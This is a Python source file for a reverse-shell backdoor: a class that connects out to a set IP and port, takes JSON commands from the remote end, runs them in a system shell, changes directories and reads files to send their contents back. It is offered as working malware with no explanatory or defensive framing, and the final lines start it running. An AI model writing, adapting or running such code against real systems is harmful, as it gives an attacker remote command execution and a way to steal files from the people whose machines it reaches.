import json
import socket
import subprocess
import os
class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def exeSystem(self, command):
        return subprocess.check_output(command, shell=True)

    def reliable_send(self, data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())
        
    def reliable_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode('utf-8')
                # print(json_data)
                return json.loads(json_data)
            except ValueError:
                continue
    def change_directory(self, path):
        os.chdir(path)
        return "[+] Changing directory to " + path

    def read_file(self, path):
        with open(path, "rb" ) as file:
            return file.read()

    def run(self):
        isTrue = True
        while isTrue == True:
            try:
                # output = "\n[+] Connection established.\n"
                # connection.sendall(output.encode('utf-8'))

                command = self.reliable_receive()
                if command[0] == "exit":
                    self.connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    try:
                        command_result = self.change_directory(command[1])
                        recvData = self.reliable_send(command_result)
                    except Exception as e:
                        print("Exception: ", e)
                elif command[0] == "D:":
                    command_result = self.change_directory(command[0])
                    recvData = self.reliable_send(command_result)
                elif command[0] == "download":
                    command_result = self.read_file(command[1])
                    recvData = self.reliable_send(command_result.decode('utf-8', errors='ignore'))
                else:
                    command_result = self.exeSystem(command)
                    recvData = self.reliable_send(command_result.decode('cp1258', errors='ignore'))
                # if(command == "exit" or command == "quit"):
                #     self.connection.close()
                #     isTrue = False
            except Exception as e:
                print("Exception: ", e)

backdoor = Backdoor("0.0.0.0", 9999)
backdoor.run()